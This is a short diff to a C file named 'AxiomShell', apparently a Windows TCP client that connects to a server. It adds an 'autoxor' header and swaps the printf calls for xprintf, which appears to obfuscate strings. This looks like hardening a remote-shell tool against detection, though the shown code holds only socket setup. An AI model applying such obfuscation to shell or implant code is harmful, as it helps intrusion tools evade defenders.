@@ -2,6 +2,7 @@
 #include <stdio.h>
 
 #include "AxiomShell.h"
+#include "autoxor.h"
 #include "Glibc.h"
 #include "Utils.h"
 #include "json.h"
@@ -23,7 +24,7 @@ int main(int argc, char** argv, const char** env)
 	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (result != 0)
 	{
-		printf("[!] WSAStartup(): %d\n", result);
+		xprintf("[!] WSAStartup(): %d\n", result);
 		return (1);
 	}
 
@@ -31,7 +32,7 @@ int main(int argc, char** argv, const char** env)
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 	if (sock == INVALID_SOCKET)
 	{
-		printf("[!] socket(): %d\n", WSAGetLastError());
+		xprintf("[!] socket(): %d\n", WSAGetLastError());
 		WSACleanup();
 		return (1);
 	}
@@ -44,7 +45,7 @@ int main(int argc, char** argv, const char** env)
 	// Connect to the server
 	if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
 	{
-		printf("[!] connect(): %d\n", WSAGetLastError());
+		xprintf("[!] connect(): %d\n", WSAGetLastError());
 		closesocket(sock);
 		WSACleanup();
 		return (1);
